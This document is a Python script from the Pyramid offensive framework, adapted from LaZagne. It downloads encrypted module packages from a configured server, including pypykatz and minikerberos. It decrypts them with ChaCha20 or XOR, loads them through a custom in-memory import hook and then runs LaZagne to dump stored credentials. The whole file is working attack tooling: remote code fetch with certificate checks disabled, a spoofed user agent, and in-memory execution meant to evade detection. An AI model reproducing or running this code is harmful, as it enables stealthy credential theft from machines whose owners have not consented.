'''
Author: @snovvcrash (c) 2022

Update 04-2023: @naksyn - bumped to work with Pyramid v.0.1

Description: Pyramid Base script for executing LaZagne in-memory.

Instructions: See README on https://github.com/naksyn/Pyramid

Credits:
  - @naksyn (Pyramid Project)
  - Alessandro Zani (LaZagne)

Copyright 2023
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"),
to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

This script also contains an adaptation of LaZagne: https://github.com/AlessandroZ/LaZagne/blob/master/Windows/laZagne.py
'''

import os
import base64
import ssl
import importlib
import zipfile
import urllib.request
import sys
import io
import time
import logging
import ctypes
import inspect


### This config is generated by Pyramid server upon startup and based on command line given
### AUTO-GENERATED PYRAMID CONFIG ### DELIMITER

pyramid_server='192.168.1.2'
pyramid_port='80'
pyramid_user='test'
pyramid_pass='pass'
encryption='chacha20'
encryptionpass='chacha20'
chacha20IV=b'12345678'
pyramid_http='http'
encode_encrypt_url='/login/'

### END DELIMITER


###### CHANGE THIS BLOCK ##########


### GENERAL CONFIG ####
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'

### Directory to which extract pyds dependencies (cryptodome, paramiko etc.) - can also be a Network Share e.g. \\\\share\\folder
### setting to false extract to current directory
extraction_dir=False


### LAZAGNE CONFIG ###
lazagne_module = 'all'
lazagne_verbosity = ''  # '' / '-v' / '-vv'

#############################

#### DO NOT CHANGE BELOW THIS LINE #####



### ChaCha encryption stub - reduced rounds for performance

def yield_chacha20_xor_stream(key, iv, position=0):
  """Generate the xor stream with the ChaCha20 cipher."""
  if not isinstance(position, int):
    raise TypeError
  if position & ~0xffffffff:
    raise ValueError('Position is not uint32.')
  if not isinstance(key, bytes):
    raise TypeError
  if not isinstance(iv, bytes):
    raise TypeError
  if len(key) != 32:
    raise ValueError
  if len(iv) != 8:
    raise ValueError

  def rotate(v, c):
    return ((v << c) & 0xffffffff) | v >> (32 - c)

  def quarter_round(x, a, b, c, d):
    x[a] = (x[a] + x[b]) & 0xffffffff
    x[d] = rotate(x[d] ^ x[a], 16)
    x[c] = (x[c] + x[d]) & 0xffffffff
    x[b] = rotate(x[b] ^ x[c], 12)
    x[a] = (x[a] + x[b]) & 0xffffffff
    x[d] = rotate(x[d] ^ x[a], 8)
    x[c] = (x[c] + x[d]) & 0xffffffff
    x[b] = rotate(x[b] ^ x[c], 7)

  ctx = [0] * 16
  ctx[:4] = (1634760805, 857760878, 2036477234, 1797285236)
  ctx[4 : 12] = struct.unpack('<8L', key)
  ctx[12] = ctx[13] = position
  ctx[14 : 16] = struct.unpack('<LL', iv)
  while 1:
    x = list(ctx)
    for i in range(3):
      quarter_round(x, 0, 4,  8, 12)
      quarter_round(x, 1, 5,  9, 13)
      quarter_round(x, 2, 6, 10, 14)
      quarter_round(x, 3, 7, 11, 15)
      quarter_round(x, 0, 5, 10, 15)
      quarter_round(x, 1, 6, 11, 12)
      quarter_round(x, 2, 7,  8, 13)
      quarter_round(x, 3, 4,  9, 14)
    for c in struct.pack('<16L', *(
        (x[i] + ctx[i]) & 0xffffffff for i in range(16))):
      yield c
    ctx[12] = (ctx[12] + 1) & 0xffffffff
    if ctx[12] == 0:
      ctx[13] = (ctx[13] + 1) & 0xffffffff


def encrypt_chacha20(data, key, iv=None, position=0):
  """Encrypt (or decrypt) with the ChaCha20 cipher."""
  if not isinstance(data, bytes):
    raise TypeError
  if iv is None:
    iv = b'\0' * 8
  if isinstance(key, bytes):
    if not key:
      raise ValueError('Key is empty.')
    if len(key) < 32:
      # TODO(pts): Do key derivation with PBKDF2 or something similar.
      key = (key * (32 // len(key) + 1))[:32]
    if len(key) > 32:
      raise ValueError('Key too long.')

  return bytes(a ^ b for a, b in
      zip(data, yield_chacha20_xor_stream(key, iv, position)))

### XOR encryption stub

def encrypt(data, key):
    xored_data = []
    i = 0
    for data_byte in data:
        if i < len(key):
            xored_byte = data_byte ^ key[i]
            xored_data.append(xored_byte)
            i += 1
        else:
            xored_byte = data_byte ^ key[0]
            xored_data.append(xored_byte)
            i = 1
    return bytes(xored_data)


### Encryption wrapper ####

def encrypt_wrapper(data, encryption):
    if encryption == 'xor':
        result=encrypt(data, encryptionpass.encode())
        return result
    elif encryption == 'chacha20':
        result=encrypt_chacha20(data, encryptionpass.encode(),chacha20IV)
        return result		



cwd = os.getcwd()

if not extraction_dir:
	extraction_dir=cwd
	
sys.path.insert(1,extraction_dir)

### separator --- is used by Pyramid server to look into the specified dependency folder

zip_name = 'lazagne---Cryptodome'
print("[*] Downloading and unpacking on disk Cryptodome pyds dependencies on dir {}".format(extraction_dir))

gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
gcontext.check_hostname = False
gcontext.verify_mode = ssl.CERT_NONE
request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
          base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'), \
          headers={'User-Agent': user_agent})
base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
with urllib.request.urlopen(request, context=gcontext) as response:
   zip_web = response.read()

print("[*] Decrypting received file")   
zip_web= encrypt_wrapper(zip_web, encryption)
   
with zipfile.ZipFile(io.BytesIO(zip_web), 'r') as zip_ref:
	zip_ref.extractall(cwd)


#### MODULE IMPORTER ####

moduleRepo = {}
_meta_cache = {}

# [0] = .py ext, is_package = False
# [1] = /__init__.py ext, is_package = True
_search_order = [('.py', False), ('/__init__.py', True)]


class ZipImportError(ImportError):
	"""Exception raised by zipimporter objects."""

# _get_info() = takes the fullname, then subpackage name (if applicable),
# and searches for the respective module or package


class CFinder(object):
	"""Import Hook"""
	def __init__(self, repoName):
		self.repoName = repoName
		self._source_cache = {}

	def _get_info(self, fullname):
		"""Search for the respective package or module in the zipfile object"""
		parts = fullname.split('.')
		submodule = parts[-1]
		modulepath = '/'.join(parts)

		#check to see if that specific module exists

		for suffix, is_package in _search_order:
			relpath = modulepath + suffix
			try:
				moduleRepo[self.repoName].getinfo(relpath)
			except KeyError:
				pass
			else:
				return submodule, is_package, relpath

		#Error out if we can find the module/package
		msg = ('Unable to locate module %s in the %s repo' % (submodule, self.repoName))
		raise ZipImportError(msg)

	def _get_source(self, fullname):
		"""Get the source code for the requested module"""
		submodule, is_package, relpath = self._get_info(self.repoName, fullname)
		fullpath = '%s/%s' % (self.repoName, relpath)
		if relpath in self._source_cache:
			source = self._source_cache[relpath]
			return submodule, is_package, fullpath, source
		try:
			### added .decode
			source =  moduleRepo[self.repoName].read(relpath).decode()
			#print(source)
			source = source.replace('\r\n', '\n')
			source = source.replace('\r', '\n')
			self._source_cache[relpath] = source
			return submodule, is_package, fullpath, source
		except:
			raise ZipImportError("Unable to obtain source for module %s" % (fullpath))

	def find_spec(self, fullname, path=None, target=None):
		try:
			submodule, is_package, relpath = self._get_info(fullname)
		except ImportError:
			return None
		else:
			return importlib.util.spec_from_loader(fullname, self)

	def create_module(self, spec):
		return None

	def exec_module(self, module):
		submodule, is_package, fullpath, source = self._get_source(module.__name__)
		code = compile(source, fullpath, 'exec')
		if is_package:
			module.__path__ = [os.path.dirname(fullpath)]
		exec(code, module.__dict__)

	def get_data(self, fullpath):

		prefix = os.path.join(self.repoName, '')
		if not fullpath.startswith(prefix):
			raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
		relpath = fullpath[len(prefix):]
		try:
			return moduleRepo[self.repoName].read(relpath)
		except KeyError:
			raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

	def is_package(self, fullname):
		"""Return if the module is a package"""
		submodule, is_package, relpath = self._get_info(self.repoName, fullname)
		return is_package

	def get_code(self, fullname):
		submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
		return compile(source, fullpath, 'exec')

def install_hook(repoName):
	if repoName not in _meta_cache:
		finder = CFinder(repoName)
		_meta_cache[repoName] = finder
		sys.meta_path.append(finder)

def remove_hook(repoName):
	if repoName in _meta_cache:
		finder = _meta_cache.pop(repoName)
		sys.meta_path.remove(finder)

def hook_routine(fileName,zip_web):
	#print(zip_web)
	zf=zipfile.ZipFile(io.BytesIO(zip_web), 'r')
	#print(zf)
	moduleRepo[fileName]=zf
	install_hook(fileName)


zip_list = [
	'lazagne---future',
	'lazagne---pyasn1',
	'lazagne---rsa',
	'lazagne---asn1crypto',
	'lazagne---unicrypto',
	'lazagne---minidump',
	'lazagne---minikerberos',
	'lazagne---pypykatz',
	'lazagne---lazagne'
]

for zip_name in zip_list:
    
    try:
        print("[*] Loading in memory module package: " + (zip_name.split('---')[-1] if '---' in zip_name else zip_name) )
        gcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE
        request = urllib.request.Request(pyramid_http + '://'+ pyramid_server + ':' + pyramid_port + encode_encrypt_url + \
                  base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'), \
				  headers={'User-Agent': user_agent})
				  
        base64string = base64.b64encode(bytes('%s:%s' % (pyramid_user, pyramid_pass),'ascii'))
        request.add_header("Authorization", "Basic %s" % base64string.decode('utf-8'))
        if '---' in zip_name:
            zip_name=zip_name.split('---')[-1]
        with urllib.request.urlopen(request, context=gcontext) as response:
            zip_web = response.read()
            print("[*] Decrypting received file") 
            zip_web= encrypt_wrapper(zip_web,encryption)
            hook_routine(zip_name, zip_web)

    except Exception as e:
        print(e)

print("[*] Modules imported")

# -*- coding: utf-8 -*- 
# !/usr/bin/python

##############################################################################
#                                                                            #
#                           By Alessandro ZANNI                              #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)

import argparse
import logging
import sys
import time
import os

from lazagne.config.write_output import write_in_file, StandardOutput
from lazagne.config.manage_modules import get_categories
from lazagne.config.constant import constant
from lazagne.config.run import run_lazagne, create_module_dic

constant.st = StandardOutput()  # Object used to manage the output / write functions (cf write_output file)
modules = create_module_dic()


def output(output_dir=None, txt_format=False, json_format=False, all_format=False):
    if output_dir:
        if os.path.isdir(output_dir):
            constant.folder_name = output_dir
        else:
            print('[!] Specify a directory, not a file !')

    if txt_format:
        constant.output = 'txt'

    if json_format:
        constant.output = 'json'

    if all_format:
        constant.output = 'all'

    if constant.output:
        if not os.path.exists(constant.folder_name):
            os.makedirs(constant.folder_name)
            # constant.file_name_results = 'credentials' # let the choice of the name to the user

        if constant.output != 'json':
            constant.st.write_header()


def quiet_mode(is_quiet_mode=False):
    if is_quiet_mode:
        constant.quiet_mode = True


def verbosity(verbose=0):
    # Write on the console + debug file
    if verbose == 0:
        level = logging.CRITICAL
    elif verbose == 1:
        level = logging.INFO
    elif verbose >= 2:
        level = logging.DEBUG

    formatter = logging.Formatter(fmt='%(message)s')
    stream = logging.StreamHandler(sys.stdout)
    stream.setFormatter(formatter)
    root = logging.getLogger()
    root.setLevel(level)
    # If other logging are set
    for r in root.handlers:
        r.setLevel(logging.CRITICAL)
    root.addHandler(stream)


def manage_advanced_options(user_password=None):
    if user_password:
        constant.user_password = user_password


def runLaZagne(category_selected='all', subcategories={}, password=None):
    """
    This function will be removed, still there for compatibility with other tools
    Everything is on the config/run.py file
    """
    for pwd_dic in run_lazagne(category_selected=category_selected, subcategories=subcategories, password=password):
        yield pwd_dic


def clean_args(arg):
    """
    Remove not necessary values to get only subcategories
    """
    for i in ['output', 'write_normal', 'write_json', 'write_all', 'verbose', 'auditType', 'quiet']:
        try:
            del arg[i]
        except Exception:
            pass
    return arg


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description=constant.st.banner, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-version', action='version', version='Version ' + str(constant.CURRENT_VERSION),
                        help='laZagne version')

    # ------------------------------------------- Permanent options -------------------------------------------
    # Version and verbosity
    PPoptional = argparse.ArgumentParser(
        add_help=False,
        formatter_class=lambda prog: argparse.HelpFormatter(prog,
                                                            max_help_position=constant.max_help)
    )
    PPoptional._optionals.title = 'optional arguments'
    PPoptional.add_argument('-v', dest='verbose', action='count', default=0, help='increase verbosity level')
    PPoptional.add_argument('-quiet', dest='quiet', action='store_true', default=False,
                            help='quiet mode: nothing is printed to the output')

    # Output
    PWrite = argparse.ArgumentParser(
        add_help=False,
        formatter_class=lambda prog: argparse.HelpFormatter(prog,
                                                            max_help_position=constant.max_help)
    )
    PWrite._optionals.title = 'Output'
    PWrite.add_argument('-oN', dest='write_normal', action='store_true', default=None,
                        help='output file in a readable format')
    PWrite.add_argument('-oJ', dest='write_json', action='store_true', default=None,
                        help='output file in a json format')
    PWrite.add_argument('-oA', dest='write_all', action='store_true', default=None, help='output file in both format')
    PWrite.add_argument('-output', dest='output', action='store', default='.',
                        help='destination path to store results (default:.)')

    # Windows user password
    PPwd = argparse.ArgumentParser(
        add_help=False,
        formatter_class=lambda prog: argparse.HelpFormatter(
            prog,
            max_help_position=constant.max_help)
    )
    PPwd._optionals.title = 'Windows User Password'
    PPwd.add_argument('-password', dest='password', action='store',
                      help='Windows user password (used to decrypt creds files)')

    # -------------------------- Add options and suboptions to all modules --------------------------
    all_subparser = []
    all_categories = get_categories()
    for c in all_categories:
        all_categories[c]['parser'] = argparse.ArgumentParser(
            add_help=False,
            formatter_class=lambda prog: argparse.HelpFormatter(prog,
                                                                max_help_position=constant.max_help)
        )
        all_categories[c]['parser']._optionals.title = all_categories[c]['help']

        # Manage options
        all_categories[c]['subparser'] = []
        for module in modules[c]:
            m = modules[c][module]
            all_categories[c]['parser'].add_argument(m.options['command'], action=m.options['action'],
                                                 dest=m.options['dest'], help=m.options['help'])

            # Manage all suboptions by modules
            if m.suboptions and m.name != 'thunderbird':
                tmp = []
                for sub in m.suboptions:
                    tmp_subparser = argparse.ArgumentParser(
                        add_help=False,
                        formatter_class=lambda prog: argparse.HelpFormatter(
                            prog,
                            max_help_position=constant.max_help)
                    )
                    tmp_subparser._optionals.title = sub['title']
                    if 'type' in sub:
                        tmp_subparser.add_argument(sub['command'], type=sub['type'], action=sub['action'],
                                                   dest=sub['dest'], help=sub['help'])
                    else:
                        tmp_subparser.add_argument(sub['command'], action=sub['action'], dest=sub['dest'],
                                                   help=sub['help'])
                    tmp.append(tmp_subparser)
                    all_subparser.append(tmp_subparser)
                    all_categories[c]['subparser'] += tmp

    # ------------------------------------------- Print all -------------------------------------------

    parents = [PPoptional] + all_subparser + [PPwd, PWrite]
    dic = {'all': {'parents': parents, 'help': 'Run all modules'}}
    for c in all_categories:
        parser_tab = [PPoptional, all_categories[c]['parser']]
        if 'subparser' in all_categories[c]:
            if all_categories[c]['subparser']:
                parser_tab += all_categories[c]['subparser']
        parser_tab += [PPwd, PWrite]
        dic_tmp = {c: {'parents': parser_tab, 'help': 'Run %s module' % c}}
        # Concatenate 2 dic
        dic = dict(dic, **dic_tmp)

    # Main commands
    subparsers = parser.add_subparsers(help='Choose a main command')
    for d in dic:
        subparsers.add_parser(d, parents=dic[d]['parents'], help=dic[d]['help']).set_defaults(auditType=d)

    # ------------------------------------------- Parse arguments -------------------------------------------

    args = [lazagne_module]
    if lazagne_verbosity:
    	args += [lazagne_verbosity]
    args = dict(parser.parse_args(args)._get_kwargs())
    arguments = parser.parse_args()

    # Define constant variables
    output(
        output_dir=args['output'],
        txt_format=args['write_normal'],
        json_format=args['write_json'],
        all_format=args['write_all']
    )
    verbosity(verbose=args['verbose'])
    manage_advanced_options(user_password=args.get('password', None))
    quiet_mode(is_quiet_mode=args['quiet'])

    # Print the title
    constant.st.first_title()

    start_time = time.time()

    category = args['auditType']
    subcategories = clean_args(args)

    for r in runLaZagne(category_selected=category, subcategories=subcategories, password=args.get('password', None)):
        pass

    write_in_file(constant.stdout_result)
    constant.st.print_footer(elapsed_time=str(time.time() - start_time))
